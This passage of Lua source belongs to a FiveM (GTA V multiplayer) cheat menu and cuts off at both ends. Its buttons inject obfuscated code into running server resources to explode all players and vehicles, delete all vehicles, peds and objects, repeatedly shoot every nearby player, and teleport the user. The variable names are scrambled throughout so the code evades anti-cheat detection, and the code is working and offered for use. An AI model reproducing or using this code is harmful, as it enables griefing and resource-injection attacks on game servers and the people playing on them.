                            Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, ZtXmqLpEas, false, false, false)

                            -- Apply downward force to simulate falling
                            VmxrLa9Ewt(QxoZnmWlae, 1, 0.0, 0.0, 5000.0, 0.0, 0.0, 0.0, 0, true, true, true, false, true)

                            -- Wait 250ms to allow the fall to start
                            OplKvms9te(250)

                            -- Freeze player in place
                            DjRq08bKxu(QxoZnmWlae, true)

                            -- Equip player with a parachute
                            PfQsXoEr6b(QxoZnmWlae, "gadget_parachute", 1, false, true)
                            WvNay7Zplm(QxoZnmWlae, false) -- Trigger parachute task

                            -- Freeze player again to prevent movement
                            DjRq08bKxu(QxoZnmWlae, true)

                            -- Load the "player_one" (Franklin) model
                            local UixZpvLoa9 = EkLnZmcTya("player_one")
                            YdWxVoEna3(UixZpvLoa9)
                            -- Wait until the model is loaded
                            while not GcvRtPszYp(UixZpvLoa9) do OplKvms9te(0) end

                            -- Create a table to store created peds
                            local TzsPlcxQam = {}
                            -- Spawn 130 invisible peds at the player's location
                            for K9wo = 1, 130 do
                                local IuxErv7Pqa = Jf9uZxcTwa(28, UixZpvLoa9, EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z, GzqLpAxdsv, true, true)
                                if IuxErv7Pqa and VdNzWqbEyf(IuxErv7Pqa) then
                                    MnVc8sQaLp(IuxErv7Pqa, true, true) -- Mark ped as mission entity
                                    awrt325etd(IuxErv7Pqa, true) -- Block non-temporary events
                                    awfaw4eraq(IuxErv7Pqa, 0, true) -- Make ped invisible
                                    table.insert(TzsPlcxQam, IuxErv7Pqa) -- Store ped in table
                                end
                                OplKvms9te(1) -- Small delay to prevent freezing
                            end

                            -- Release the model from memory
                            KrXpTuwq9c(UixZpvLoa9)

                            -- Wait 300ms before cleaning up
                            OplKvms9te(300)

                            -- Delete all created peds (repeated calls may be for reliability)
                            for _, bTzyPq7Xsl in ipairs(TzsPlcxQam) do
                                if VdNzWqbEyf(bTzyPq7Xsl) then
                                    AxWtRuLskz(bTzyPq7Xsl) -- Repeated deletion attempts
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                    AxWtRuLskz(bTzyPq7Xsl)
                                end
                            end

                            -- Unfreeze the player
                            DjRq08bKxu(QxoZnmWlae, false)

                            -- Find the ground Z-coordinate at the player's location
                            local ZkxyPqtLs0, Zfound = BnQvKdsLxa(EzPwqLtYas.x, EzPwqLtYas.y, EzPwqLtYas.z + 100.0, 0, false)
                            if not ZkxyPqtLs0 then
                                Zfound = EzPwqLtYas.z -- Fallback to current Z if ground not found
                            end

                            -- Wait 1 second before teleporting
                            OplKvms9te(1000)

                            -- Teleport player to just above ground level
                            Tmn1rZxOq8(QxoZnmWlae, EzPwqLtYas.x, EzPwqLtYas.y, Zfound + 1.0, false, false, false)
                            DjRq08bKxu(QxoZnmWlae, true) -- Freeze player briefly
                            DjRq08bKxu(QxoZnmWlae, false) -- Unfreeze player
                        end)
                    end)
                end

                -- Execute the main function
                sfehwq34rw7td()
            ]])
        end)                    


        MachoMenuButton(ServerTabSections[2], "Cone Everyone", function() 
            local model = GetHashKey("prop_roadcone02a")
            RequestModel(model) 
            while not HasModelLoaded(model) do 
                Wait(0) 
            end

            local function putCone(ped)
                if not DoesEntityExist(ped) or IsEntityDead(ped) then return end
                local pos = GetEntityCoords(ped)
                local obj = CreateObject(model, pos.x, pos.y, pos.z, true, true, false)
                SetEntityAsMissionEntity(obj, true, true)
                SetEntityCollision(obj, false, false)
                SetEntityInvincible(obj, true)
                SetEntityCanBeDamaged(obj, false)
                local head = GetPedBoneIndex(ped, 31086)
                AttachEntityToEntity(obj, ped, head, 0.0, 0.0, 0.25, 0.0, 0.0, 0.0, 
                    false, false, true, false, 2, true)
            end

            putCone(PlayerPedId())

            for _, pid in ipairs(GetActivePlayers()) do
                putCone(GetPlayerPed(pid))
            end

            local peds = GetGamePool and GetGamePool('CPed') or {}
            for _, ped in ipairs(peds) do
                if not IsPedAPlayer(ped) then
                    putCone(ped)
                end
            end
        end)

        MachoMenuButton(ServerTabSections[2], "Explode All Players", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function fGhJkLpOiUzXcVb()
                    local aSdFgHjKlQwErTy = GetActivePlayers
                    local pOiUyTrEeRwQtYy = DoesEntityExist
                    local mNbVcCxZzLlKkJj = GetEntityCoords
                    local hGjFkDlSaPwOeIr = AddOwnedExplosion
                    local tYuIoPaSdFgHjKl = PlayerPedId

                    local eRtYuIoPlMnBvCx = aSdFgHjKlQwErTy()
                    for _, wQeRtYuIoPlMnBv in ipairs(eRtYuIoPlMnBvCx) do
                        local yUiOpAsDfGhJkLz = GetPlayerPed(wQeRtYuIoPlMnBv)
                        if pOiUyTrEeRwQtYy(yUiOpAsDfGhJkLz) and yUiOpAsDfGhJkLz ~= tYuIoPaSdFgHjKl() then
                            local nMzXcVbNmQwErTy = mNbVcCxZzLlKkJj(yUiOpAsDfGhJkLz)
                            hGjFkDlSaPwOeIr(
                                tYuIoPaSdFgHjKl(),
                                nMzXcVbNmQwErTy.x,
                                nMzXcVbNmQwErTy.y,
                                nMzXcVbNmQwErTy.z,
                                6,     -- Explosion type
                                1.0,   -- Damage scale
                                true,  -- Audible
                                false, -- Invisible
                                0.0    -- Camera shake
                            )
                        end
                    end
                end

                fGhJkLpOiUzXcVb()
            ]])
        end)

        MachoMenuButton(ServerTabSections[2], "Explode All Vehicles", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function uYhGtFrEdWsQaZx()
                    local rTyUiOpAsDfGhJk = GetGamePool
                    local xAsDfGhJkLpOiUz = DoesEntityExist
                    local cVbNmQwErTyUiOp = GetEntityCoords
                    local vBnMkLoPiUyTrEw = AddOwnedExplosion
                    local nMzXcVbNmQwErTy = PlayerPedId

                    local _vehicles = rTyUiOpAsDfGhJk("CVehicle")
                    local me = nMzXcVbNmQwErTy()
                    for _, veh in ipairs(_vehicles) do
                        if xAsDfGhJkLpOiUz(veh) then
                            local pos = cVbNmQwErTyUiOp(veh)
                            vBnMkLoPiUyTrEw(me, pos.x, pos.y, pos.z, 6, 2.0, true, false, 0.0)
                        end
                    end
                end
                uYhGtFrEdWsQaZx()
            ]])
        end)

        MachoMenuButton(ServerTabSections[2], "Delete All Vehicles", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function zXcVbNmQwErTyUi()
                    local aSdFgHjKlQwErTy = GetGamePool
                    local pOiUyTrEeRwQtYy = DoesEntityExist
                    local mNbVcCxZzLlKkJj = NetworkRequestControlOfEntity
                    local hGjFkDlSaPwOeIr = NetworkHasControlOfEntity
                    local tYuIoPaSdFgHjKl = DeleteEntity
                    local yUiOpAsDfGhJkLz = PlayerPedId
                    local uIoPaSdFgHjKlQw = GetVehiclePedIsIn
                    local gJkLoPiUyTrEqWe = GetGameTimer
                    local fDeSwQaZxCvBnMm = Wait

                    local me = yUiOpAsDfGhJkLz()
                    local myVeh = uIoPaSdFgHjKlQw(me, false)

                    local vehicles = aSdFgHjKlQwErTy("CVehicle")
                    for _, veh in ipairs(vehicles) do
                        if pOiUyTrEeRwQtYy(veh) and veh ~= myVeh then
                            mNbVcCxZzLlKkJj(veh)
                            local timeout = gJkLoPiUyTrEqWe() + 500
                            while not hGjFkDlSaPwOeIr(veh) and gJkLoPiUyTrEqWe() < timeout do
                                fDeSwQaZxCvBnMm(0)
                            end
                            if hGjFkDlSaPwOeIr(veh) then
                                tYuIoPaSdFgHjKl(veh)
                            end
                        end
                    end
                end
                zXcVbNmQwErTyUi()
            ]])
        end)

        MachoMenuButton(ServerTabSections[2], "Delete All Peds", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function qWeRtYuIoPlMnBv()
                    local zXcVbNmQwErTyUi = GetGamePool
                    local aSdFgHjKlQwErTy = DoesEntityExist
                    local pOiUyTrEeRwQtYy = DeleteEntity
                    local mNbVcCxZzLlKkJj = PlayerId
                    local hGjFkDlSaPwOeIr = GetPlayerPed
                    local tYuIoPaSdFgHjKl = NetworkRequestControlOfEntity
                    local yUiOpAsDfGhJkLz = NetworkHasControlOfEntity
                    local uIoPaSdFgHjKlQw = GetGameTimer
                    local gJkLoPiUyTrEqWe = Wait
                    local vBnMkLoPiUyTrEw = IsPedAPlayer

                    local me = hGjFkDlSaPwOeIr(mNbVcCxZzLlKkJj())
                    local peds = zXcVbNmQwErTyUi("CPed")

                    for _, ped in ipairs(peds) do
                        if aSdFgHjKlQwErTy(ped) and ped ~= me and not vBnMkLoPiUyTrEw(ped) then
                            tYuIoPaSdFgHjKl(ped)
                            local timeout = uIoPaSdFgHjKlQw() + 500
                            while not yUiOpAsDfGhJkLz(ped) and uIoPaSdFgHjKlQw() < timeout do
                                gJkLoPiUyTrEqWe(0)
                            end
                            if yUiOpAsDfGhJkLz(ped) then
                                pOiUyTrEeRwQtYy(ped)
                            end
                        end
                    end
                end
                qWeRtYuIoPlMnBv()
            ]])
        end)

        MachoMenuButton(ServerTabSections[2], "Delete All Objects", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function mNqAzXwSeRdTfGy()
                    local rTyUiOpAsDfGhJk = GetGamePool
                    local xAsDfGhJkLpOiUz = DoesEntityExist
                    local cVbNmQwErTyUiOp = DeleteEntity
                    local vBnMkLoPiUyTrEw = NetworkRequestControlOfEntity
                    local nMzXcVbNmQwErTy = NetworkHasControlOfEntity
                    local yUiOpAsDfGhJkLz = GetGameTimer
                    local uIoPaSdFgHjKlQw = Wait

                    local objects = rTyUiOpAsDfGhJk("CObject")
                    for _, obj in ipairs(objects) do
                        if xAsDfGhJkLpOiUz(obj) then
                            vBnMkLoPiUyTrEw(obj)
                            local timeout = yUiOpAsDfGhJkLz() + 500
                            while not nMzXcVbNmQwErTy(obj) and yUiOpAsDfGhJkLz() < timeout do
                                uIoPaSdFgHjKlQw(0)
                            end
                            if nMzXcVbNmQwErTy(obj) then
                                cVbNmQwErTyUiOp(obj)
                            end
                        end
                    end
                end
                mNqAzXwSeRdTfGy()
            ]])
        end)

        MachoMenuButton(ServerTabSections[2], "ShowIDs [New Feature]", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local displayIDs = false -- toggles both self + nearby IDs

        function DrawText3D(x, y, z, text)
            local onScreen, _x, _y = World3dToScreen2d(x, y, z)
            if onScreen then
                SetTextFont(0)
                SetTextProportional(1)
                SetTextScale(0.5, 0.5)
                SetTextColour(255, 255, 255, 255)
                SetTextEntry("STRING")
                AddTextComponentString(text)
                DrawText(_x, _y)
            end
        end

        Citizen.CreateThread(function()
            while true do
                Citizen.Wait(0)

                -- Toggle both IDs with E
                if IsControlJustPressed(0, 38) then
                    displayIDs = not displayIDs
                end

                if displayIDs then
                    -- Draw own ID
                    local playerId = GetPlayerServerId(PlayerId())
                    SetTextFont(0)
                    SetTextProportional(1)
                    SetTextScale(0.3, 0.3)
                    SetTextColour(255, 255, 255, 255)
                    SetTextEntry("STRING")
                    AddTextComponentString("Your Player ID: " .. playerId)
                    DrawText(0.5, 0.1)

                    -- Draw nearby players' IDs
                    local playerPed = PlayerPedId()
                    local playerCoords = GetEntityCoords(playerPed)
                    local players = GetActivePlayers()

                    for _, player in ipairs(players) do
                        local targetPed = GetPlayerPed(player)
                        if targetPed ~= playerPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            local dist = #(playerCoords - targetCoords)

                            if dist < 40.0 then
                                local targetId = GetPlayerServerId(player)
                                DrawText3D(targetCoords.x, targetCoords.y, targetCoords.z + 1.0, "ID: " .. targetId)
                            end
                        end
                    end
                end
            end
        end)
            ]])
        end)

        MachoMenuCheckbox(ServerTabSections[2], "Kill Everyone", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if aSwDeFgHiJkLoPx == nil then aSwDeFgHiJkLoPx = false end
                aSwDeFgHiJkLoPx = true

                local function pLoMkIjUhbGyTf()
                    local mAxPlErOy = PlayerPedId()
                    local rVtNiUcEx = GetHashKey("WEAPON_ASSAULTRIFLE")
                    local gBvTnCuXe = 100
                    local aSdFgHjKl = 1000.0
                    local lKjHgFdSa = 300.0

                    local nBxMzLqPw = CreateThread
                    local qWeRtYuiOp = ShootSingleBulletBetweenCoords

                    nBxMzLqPw(function()
                        while aSwDeFgHiJkLoPx and not Unloaded do
                            Wait(gBvTnCuXe)
                            local bNmZxSwEd = GetActivePlayers()
                            local jUiKoLpMq = GetEntityCoords(mAxPlErOy)

                            for _, wQaSzXedC in ipairs(bNmZxSwEd) do
                                local zAsXcVbNm = GetPlayerPed(wQaSzXedC)
                                if zAsXcVbNm ~= mAxPlErOy and DoesEntityExist(zAsXcVbNm) and not IsPedDeadOrDying(zAsXcVbNm, true) then
                                    local eDxCfVgBh = GetEntityCoords(zAsXcVbNm)
                                    if #(eDxCfVgBh - jUiKoLpMq) <= lKjHgFdSa then
                                        local xScVbNmAz = vector3(
                                            eDxCfVgBh.x + (math.random() - 0.5) * 0.8,
                                            eDxCfVgBh.y + (math.random() - 0.5) * 0.8,
                                            eDxCfVgBh.z + 1.2
                                        )

                                        local dFgHjKlZx = vector3(
                                            eDxCfVgBh.x,
                                            eDxCfVgBh.y,
                                            eDxCfVgBh.z + 0.2
                                        )

                                        qWeRtYuiOp(
                                            xScVbNmAz.x, xScVbNmAz.y, xScVbNmAz.z,
                                            dFgHjKlZx.x, dFgHjKlZx.y, dFgHjKlZx.z,
                                            aSdFgHjKl,
                                            true,
                                            rVtNiUcEx,
                                            mAxPlErOy,
                                            true,
                                            false,
                                            100.0
                                        )
                                    end
                                end
                            end
                        end
                    end)
                end

                pLoMkIjUhbGyTf()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                aSwDeFgHiJkLoPx = false
            ]])
        end)

        MachoMenuCheckbox(ServerTabSections[2], "Permanent Kill Everyone", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                if qWeRtYuIoPlMnAb == nil then qWeRtYuIoPlMnAb = false end
                qWeRtYuIoPlMnAb = true

                local function bZxLmNcVqPeTyUi()
                    local vBnMkLoPi = PlayerPedId()
                    local wQaSzXedC = GetHashKey("WEAPON_TRANQUILIZER")
                    local eDxCfVgBh = 100
                    local lKjHgFdSa = 1000.0
                    local mAxPlErOy = 300.0

                    local rTwEcVzUi = CreateThread
                    local oPiLyKuJm = ShootSingleBulletBetweenCoords

                    rTwEcVzUi(function()
                        while qWeRtYuIoPlMnAb and not Unloaded do
                            Wait(eDxCfVgBh)
                            local aSdFgHjKl = GetActivePlayers()
                            local xSwEdCvFr = GetEntityCoords(vBnMkLoPi)

                            for _, bGtFrEdCv in ipairs(aSdFgHjKl) do
                                local nMzXcVbNm = GetPlayerPed(bGtFrEdCv)
                                if nMzXcVbNm ~= vBnMkLoPi and DoesEntityExist(nMzXcVbNm) and not IsPedDeadOrDying(nMzXcVbNm, true) then
                                    local zAsXcVbNm = GetEntityCoords(nMzXcVbNm)
                                    if #(zAsXcVbNm - xSwEdCvFr) <= mAxPlErOy then
                                        local jUiKoLpMq = vector3(
                                            zAsXcVbNm.x + (math.random() - 0.5) * 0.8,
                                            zAsXcVbNm.y + (math.random() - 0.5) * 0.8,
                                            zAsXcVbNm.z + 1.2
                                        )

                                        local cReAtEtHrEaD = vector3(
                                            zAsXcVbNm.x,
                                            zAsXcVbNm.y,
                                            zAsXcVbNm.z + 0.2
                                        )

                                        oPiLyKuJm(
                                            jUiKoLpMq.x, jUiKoLpMq.y, jUiKoLpMq.z,
                                            cReAtEtHrEaD.x, cReAtEtHrEaD.y, cReAtEtHrEaD.z,
                                            lKjHgFdSa,
                                            true,
                                            wQaSzXedC,
                                            vBnMkLoPi,
                                            true,
                                            false,
                                            100.0
                                        )
                                    end
                                end
                            end
                        end
                    end)
                end

                bZxLmNcVqPeTyUi()
            ]])
        end, function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                qWeRtYuIoPlMnAb = false
            ]])
        end)

        -- Teleport Tab
        local CoordsHandle = MachoMenuInputbox(TeleportTabSections[1], "Coords:", "x, y, z")
        MachoMenuButton(TeleportTabSections[1], "Teleport to Coords", function()
            local zXcVbNmQwErTyUi = MachoMenuGetInputbox(CoordsHandle)

            if zXcVbNmQwErTyUi and zXcVbNmQwErTyUi ~= "" then
                local aSdFgHjKlQwErTy, qWeRtYuIoPlMnBv, zLxKjHgFdSaPlMnBv = zXcVbNmQwErTyUi:match("([^,]+),%s*([^,]+),%s*([^,]+)")
                aSdFgHjKlQwErTy = tonumber(aSdFgHjKlQwErTy)
                qWeRtYuIoPlMnBv = tonumber(qWeRtYuIoPlMnBv)
                zLxKjHgFdSaPlMnBv = tonumber(zLxKjHgFdSaPlMnBv)

                if aSdFgHjKlQwErTy and qWeRtYuIoPlMnBv and zLxKjHgFdSaPlMnBv then
                    MachoInjectResource(CheckResource("monitor") and "monitor" or "any", string.format([[
                        local function b0NtdqLZKW()
                            local uYiTpLaNmZxCwEq = SetEntityCoordsNoOffset
                            local nHgFdSaZxCvBnMq = PlayerPedId
                            local XvMzAsQeTrBnLpK = IsPedInAnyVehicle
                            local QeTyUvGhTrBnAzX = GetVehiclePedIsIn
                            local BvNzMkJdHsLwQaZ = GetGroundZFor_3dCoord

                            local x, y, z = %f, %f, %f
                            local found, gZ = BvNzMkJdHsLwQaZ(x, y, z + 1000.0, true)
                            if found then z = gZ + 1.0 end

                            local ent = XvMzAsQeTrBnLpK(nHgFdSaZxCvBnMq(), false) and QeTyUvGhTrBnAzX(nHgFdSaZxCvBnMq(), false) or nHgFdSaZxCvBnMq()
                            uYiTpLaNmZxCwEq(ent, x, y, z, false, false, false)
                        end

                        b0NtdqLZKW()
                    ]], aSdFgHjKlQwErTy, qWeRtYuIoPlMnBv, zLxKjHgFdSaPlMnBv))
                end
            end
        end)

        MachoMenuButton(TeleportTabSections[1], "Waypoint", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function xQX7uzMNfb()
                    local mNbVcXtYuIoPlMn = GetFirstBlipInfoId
                    local zXcVbNmQwErTyUi = DoesBlipExist
                    local aSdFgHjKlQwErTy = GetBlipInfoIdCoord
                    local lKjHgFdSaPlMnBv = PlayerPedId
                    local qWeRtYuIoPlMnBv = SetEntityCoords

                    local function XcVrTyUiOpAsDfGh()
                        local RtYuIoPlMnBvZx = mNbVcXtYuIoPlMn(8)
                        if not zXcVbNmQwErTyUi(RtYuIoPlMnBvZx) then return nil end
                        return aSdFgHjKlQwErTy(RtYuIoPlMnBvZx)
                    end

                    local GhTyUoLpZmNbVcXq = XcVrTyUiOpAsDfGh()
                    if GhTyUoLpZmNbVcXq then
                        local QwErTyUiOpAsDfGh = lKjHgFdSaPlMnBv()
                        qWeRtYuIoPlMnBv(QwErTyUiOpAsDfGh, GhTyUoLpZmNbVcXq.x, GhTyUoLpZmNbVcXq.y, GhTyUoLpZmNbVcXq.z + 5.0, false, false, false, true)
                    end
                end

                xQX7uzMNfb()
            ]])
        end)

        MachoMenuButton(TeleportTabSections[1], "FIB Building", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function HAZ6YqLRbM()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 140.43, -750.52, 258.15
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                HAZ6YqLRbM()
            ]])
        end)

        MachoMenuButton(TeleportTabSections[1], "Mission Row PD", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function oypB9FcNwK()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 425.1, -979.5, 30.7
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                oypB9FcNwK()
            ]])
        end)

        MachoMenuButton(TeleportTabSections[1], "Pillbox Hospital", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function TmXU0zLa4e()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 308.6, -595.3, 43.28
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                TmXU0zLa4e()
            ]])
        end)

        MachoMenuButton(TeleportTabSections[1], "Del Perro Pier", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function eLQN9XKwbJ()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = -1632.87, -1007.81, 13.07
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                eLQN9XKwbJ()
            ]])
        end)

        MachoMenuButton(TeleportTabSections[1], "Grove Street", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function YrAFvPMkqt()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 109.63, -1943.14, 20.80
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                YrAFvPMkqt()
            ]])
        end)

        MachoMenuButton(TeleportTabSections[1], "Legion Square", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function zdVCXL8rjp()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 229.21, -871.61, 30.49
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                zdVCXL8rjp()
            ]])
        end)

        MachoMenuButton(TeleportTabSections[1], "LS Customs", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function oKXpQUYwd5()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = -365.4, -131.8, 37.7
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                oKXpQUYwd5()
            ]])
        end)

        MachoMenuButton(TeleportTabSections[1], "Maze Bank", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function E1tYUMowqF()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = -75.24, -818.95, 326.1
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                E1tYUMowqF()
            ]])
        end)

        MachoMenuButton(TeleportTabSections[1], "Mirror Park", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function Ptn2qMBvYe()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 1039.2, -765.3, 57.9
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                Ptn2qMBvYe()
            ]])
        end)

        MachoMenuButton(TeleportTabSections[1], "Vespucci Beach", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function gQZf7xYULe()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = -1223.8, -1516.6, 4.4
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                gQZf7xYULe()
            ]])
        end)

        MachoMenuButton(TeleportTabSections[1], "Vinewood", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function JqXLKbvR20()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 293.2, 180.5, 104.3
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                JqXLKbvR20()
            ]])
        end)

        MachoMenuButton(TeleportTabSections[1], "Sandy Shores", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function NxvTpL3qWz()
                    local aSdFgHjKlQwErTy = PlayerPedId
                    local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                    local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                    local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                    local x, y, z = 1843.10, 3707.60, 33.52
                    local ped = aSdFgHjKlQwErTy()
                    local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                    xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
                end

                NxvTpL3qWz()
            ]])
        end)

        MachoMenuButton(TeleportTabSections[2], "Print Current Coords", function()
            MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
                local function Xy9TqLzVmN()
                    local zXcVbNmQwErTyUi = GetEntityCoords
                    local aSdFgHjKlQwErTy = PlayerPedId

                    local coords = zXcVbNmQwErTyUi(aSdFgHjKlQwErTy())
                    local x, y, z = coords.x, coords.y, coords.z
                    print(string.format("[^3JTG^7] [^4DEBUG^7] - %.2f, %.2f, %.2f", x, y, z))
                end

                Xy9TqLzVmN()
            ]])
        end)

        -- Weapon Tab

        MachoMenuCheckbox(WeaponTabSections[1], "Delete Gun", function()
MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
if DeleteGun == nil then DeleteGun = false end
DeleteGun = true
local function getEntity(player)
